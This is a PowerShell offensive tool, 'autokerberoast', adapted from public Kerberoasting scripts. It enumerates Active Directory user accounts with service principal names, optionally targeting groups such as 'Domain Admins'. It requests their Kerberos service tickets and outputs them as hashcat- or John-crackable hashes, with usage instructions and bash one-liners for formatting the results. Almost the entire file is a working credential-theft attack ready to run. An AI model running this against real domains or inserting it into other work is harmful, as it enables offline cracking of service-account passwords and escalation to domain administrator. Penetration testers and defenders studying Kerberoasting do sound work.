# Note: This version of autokerberoast relies heavily on functions from https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
#       and https://github.com/adaptivethreat/Empire/blob/2.0_beta/data/module_source/credentials/Invoke-Kerberoast.ps1 (Removed need for Mimikatz).
#
#
# Instructions:
# To list ALL SPN records associated with user accounts, run:
#       List-UserSPNs
# To list user SPNs that involve users in a particular group, run:
#       List-UserSPNs -Group "Domain Admins"
#
# When ready to obtain tickets for users in a group/domain of interest, run:
#       Invoke-AutoKerberoast -Group "Domain Admins" -Domain "dev.testlab.local"
# To obtain ALL tickets for unique user SPNs in the forest, simply run:
#       Invoke-AutoKerberoast
#
# If hashes are broken up into multiple lines, then these bash one-liners will convert saved hashes into the proper format:
#   output to terminal:     cat ./hashes.txt |tr -d "\n" | sed s/"\$krb"/"\n\$krb"/g; echo ""
#   save to text file:      temp=$(cat ./hashes.txt |tr -d "\n" | sed s/"\$krb"/"\n\$krb"/g); printf "%s" "$temp" > hashesFormatted.txt


function List-UserSPNs
{
<#
    .SYNOPSIS
    This function will List all SPNs that use User accounts.  The -Domain and -Group parameters can be used to limit your results.

    .PARAMETER Domain
    This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.

    .PARAMETER GroupName
    This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins"

    .PARAMETER DomainController
    This will redirect queries to a specific Domain Controller.  This is especially useful when environment doesn't use a DC for DNS resolutions.
    NOTE: this will only return TGS Tickets from that DC's Domain, instead of the entire forest.

    .PARAMETER ViewAll
    Switch that displays ALL SPNs, even if they are protected by the same user.
    Default is to only show 1 SPN per user account (e.g. if two MSSQL SPNs are registered to the user sqlAdmin, it will only request a ticket for the first service)

    .EXAMPLE
    PS C:\> List-UserSPNS
    PS C:\> List-UserSPNS -GroupName "Domain Admins"
    PS C:\> List-UserSPNS -Domain dev.testlab.local
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$False,Position=1)]
    [string]$Domain = "",

    [Parameter(Mandatory=$False)]
    [string]$GroupName = "",

    [Parameter(Mandatory=$False)]
    [string]$DomainController = "",

    [Parameter(Mandatory=$False)]
    [switch]$ViewAll
    )

    Add-Type -AssemblyName System.IdentityModel

    $GCs = @()

    if ( $DomainController )
    {
        $GCs += $DomainController
    }   
    elseif ( $Domain )
    {
        $GCs += $Domain
    }
    else # find them
    {
        # This code for identifying domains in current forest was Copied directly from Powerview's Get-ForestDomain Function, found at https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
        $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $Parts = $ForestSid -Split "-"
        $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
        $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
        $ForestObject.Domains | % { $GCs += $_.Name }
    }

    # Remove any duplicate Global Catalogs Entries from Array
    $GCs = $GCs | Select -uniq

    if ( -not $GCs )
    {
    	# no Global Catalogs Found
    	Write-Output "No Global Catalogs Found!"
    	Exit
    }

    <#
    Things you can extract
    Name                           Value
    ----                           -----
    admincount                     {1}
    samaccountname                 {sqlengine}
    useraccountcontrol             {66048}
    primarygroupid                 {513}
    userprincipalname              {sqlengine@medin.local}
    instancetype                   {4}
    displayname                    {sqlengine}
    pwdlastset                     {130410454241766739}
    memberof                       {CN=Domain Admins,CN=Users,DC=medin,DC=local}
    samaccounttype                 {805306368}
    serviceprincipalname           {MSSQLSvc/sql01.medin.local:1433, MSSQLSvc/sql01.medin.local}
    usnchanged                     {135252}
    lastlogon                      {130563243107145358}
    accountexpires                 {9223372036854775807}
    logoncount                     {34}
    adspath                        {LDAP://CN=sqlengine,CN=Users,DC=medin,DC=local}
    distinguishedname              {CN=sqlengine,CN=Users,DC=medin,DC=local}
    badpwdcount                    {0}
    codepage                       {0}
    name                           {sqlengine}
    whenchanged                    {9/22/2014 6:45:21 AM}
    badpasswordtime                {0}
    dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...}
    lastlogontimestamp             {130558419213902030}
    lastlogoff                     {0}
    objectclass                    {top, person, organizationalPerson, user}
    countrycode                    {0}
    cn                             {sqlengine}
    whencreated                    {4/4/2014 12:37:04 AM}
    objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...}
    objectguid                     {101 165 206 61 61 201 88 69 132 246 108 227 231 47 109 102}
    objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=medin,DC=local}
    usncreated                     {57551}
    #>

    $uniqueAccounts = New-Object System.Collections.ArrayList

    ForEach ( $GC in $GCs )
    {
    	$searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = "LDAP://" + $GC
    	$searcher.PageSize = 1000
    	$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
    	$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
    	$searcher.PropertiesToLoad.Add("name") | Out-Null
    	$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
        $searcher.PropertiesToLoad.Add("memberof") | Out-Null
        $searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
        $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
        $searcher.PropertiesToLoad.Add("whencreated") | Out-Null
        $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null

    	$searcher.SearchScope = "Subtree"
    	$results = $searcher.FindAll()

    	foreach ( $result in $results )
        {
            foreach ( $spn in $result.Properties["serviceprincipalname"] )
            {
                $groups = $result.properties.memberof
                $distingName = $result.Properties["distinguishedname"][0].ToString()

                if ( $viewAll -eq $False )
                {
                    if ( $uniqueAccounts.contains($distingName) )
                    {
                        continue
                    }
                    else
                    {
                        [void]$uniqueAccounts.add($distingName)
                    }
                }

                if ( $Groups -like "*$GroupName*" )
                {
                    Select-Object -InputObject $result -Property `
                    @{Name="SPN"; Expression={$spn.ToString()} }, `
                    @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
                    @{Name="SamAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
                    @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
                    @{Name="DistinguishedName";    Expression={$distingName} }, `
                    @{Name="MemberOf";             Expression={$groups} }, `
                    @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }, `
                    @{Name="whencreated";          Expression={$result.Properties["whencreated"][0].ToString()} } 
                }
            }
    	}
    }
}

function Invoke-AutoKerberoast
{
<#
    .SYNOPSIS
    This function automatically requests and display TGS tickets in a hashcat-compatible format.  The -Domain and -GroupName parameters can be used to execute targeted queries.

    .PARAMETER Domain
    This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.

    .PARAMETER GroupName
    This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins", or simply "admin" (wildcards will be automatically added to both sides of groupname).

    .PARAMETER SPN
    This paremeter will request and process TGS tickets for an array of SPNs (a single SPN record may also be specified).  Recommend running List-UserSPNs first to identify name of useful SPNs.

    .PARAMETER DomainController
    This will redirect List-UserSPNs queries to a specific Domain Controller.  This is especially useful when environment doesn't use a DC for DNS resolutions.
    NOTE: this will only return SPNs from that DC's Domain, instead of the entire forest.

    .PARAMETER HashFormat
    Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat style hash formatting.
    Defaults to 'Hashcat'.

    .EXAMPLE
    PS C:\> Invoke-AutoKerberoast
    PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins"
    PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain dev.testlab.local
    PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain dev.testlab.local -HashFormat John
    PS C:\> Invoke-AutoKerberoast -SPN "MSSQLSvc/sqlBox.testlab.local:1433"
    PS C:\> Invoke-AutoKerberoast -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlBox2.dev.testlab.local:1433")
    PS C:\> Invoke-AutoKerberoast -DomainController 172.20.200.100
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [string]$GroupName = "",

        [Parameter(Mandatory=$False)]
        [string]$Domain = "",

        [Parameter(Mandatory=$False)]
        [string]$DomainController = "",

        [Parameter(Mandatory=$False)]
        [string[]]$SPN,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]$HashFormat = "Hashcat",

        [Parameter(Mandatory=$False)]
        [Switch]$Mask
    )

    $SPNsArray = New-Object System.Collections.ArrayList
    $DnameArray = New-Object System.Collections.ArrayList
    $SnameArray = New-Object System.Collections.ArrayList

    if ( $SPN )
    {
        ForEach ($i in $SPN)
        {
            try
            {
                [void]$SPNsArray.Add($i)
            }
            catch
            {
                Write-Output "Something went wrong while parsing the SPN $i from the array"
                exit
            }
        }
    }
    else
    {
        $SPNs = List-UserSPNs -Group $GroupName -Domain $Domain -DomainController $DomainController | Select SPN, SamAccountName, DistinguishedName

        if ( ! $SPNs )
        {
            write-output "Unable to obtain any user account SPNs"
            exit
        }

        $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
        $SPNs | % { [void]$SnameArray.Add($_.SamAccountName) }
        $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
    }

    while ( $SPNsArray.contains("kadmin/changepw") )
    {
        $DnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
        $SnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
        $SPNsArray.Remove("kadmin/changepw")
    }

    if ( $SPNsArray.Count -eq 0 )
    {
        Write-Output "Unable to Identify any SPNs that use User accounts in this domain."
        exit
    }
    else
    {
        Write-Output "Requested Tickets:"
        $i = 1
        ForEach ( $currentSPN in $SPNsArray )
        {
            "ID#$i`:"
            "SPN: $currentSPN"
            "SAMACCOUNTNAME: " + $SnameArray[$i-1]
            "DISTINGUISHED NAME: " + $DnameArray[$i-1] + "`n"

            $i++
        }
    }
    $i = 0

    $ticketArray = New-Object System.Collections.ArrayList
    $failedTicketArray = New-Object System.Collections.ArrayList

    ForEach ( $currentSPN in $SPNsArray )
    {
        $currentSamAccountName = $SnameArray[$i]
        $currentDistringuishedName = $DnameArray[$i]
        $currentLabel = "SAMACCOUNTNAME: $currentSamAccountName; DISTINGUISHEDNAME: $currentDistringuishedName" 
        try
        {
            if ( $Mask )
            {
                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentLabel -OutputFormat $HashFormat -Mask | select -expand hash
            }
            else
            {
                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentLabel -OutputFormat $HashFormat | select -expand hash
            }
            [void]$ticketArray.Add($currentHash)
        }
        catch
        {
            # write-output $_
            $failedTicketLabel = "ID#" + ($i+1) + "_SPN: $currentSPN"
            [void]$failedTicketArray.Add($failedTicketLabel)
        }
        $i += 1
    }

    Write-Output "`n`nCaptured TGS hashes:"
    $ticketArray | % { "$_`n" }

    if ( $failedTicketArray )
    {
        Write-Output "`n`nWARNING: failed to capture hashes for the following SPNs:"
        $failedTicketArray
    }
}


function Get-SPNTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: @machosec, Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-NetUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of John).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-NetUser) to request the ticket for.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.

.EXAMPLE

Get-SPNTicket -SPN "HTTP/web.testlab.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-SPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-NetUser -SPN | Get-SPNTicket -OutputFormat Hashcat

Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, DistinguishedName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName='RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]$SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]$User,

        [Parameter(Position = 1)]
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]$OutputFormat='Hashcat',

        [Parameter(Mandatory=$False)]
        [String]
        $IdNum="",

        [Parameter(Mandatory=$False)]
        [Switch]$Mask,

        [Parameter(Mandatory=$False)]
        [String]$userLabel = ""
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = $Null
                $DistinguishedName = $Null
            }

            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            $TicketByteStream = $Ticket.GetRequest()
            if ($TicketByteStream) {
                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
                $Parts.RemoveAt($Parts.Count - 1)
                $Hash = $Parts -join 'A48201'
                $Hash = $Hash.Insert(32, '$')

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                if ($OutputFormat -match 'John') {
                    if ( $Mask )
                    {
                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_`:$Hash"
                    }
                    else
                    {
                        # John will fail if additional ":" characters are used in description field
                        $userLabel = $userLabel -replace "`:","_"
                        $SPN = $SPN -replace "`:","_"

                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_" + $userLabel + " SPN_$SPN`:$Hash"
                    }
                }
                else {
                    if ( $Mask )
                    {
                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_*`$" + $Hash
                    }
                    else
                    {
                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_" + $userLabel + " SPN: $SPN *`$" + $Hash
                    }
                }
                $Out | Add-Member Noteproperty 'Hash' $HashFormat

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')

                Write-Output $Out
                break
            }
        }
    }
}
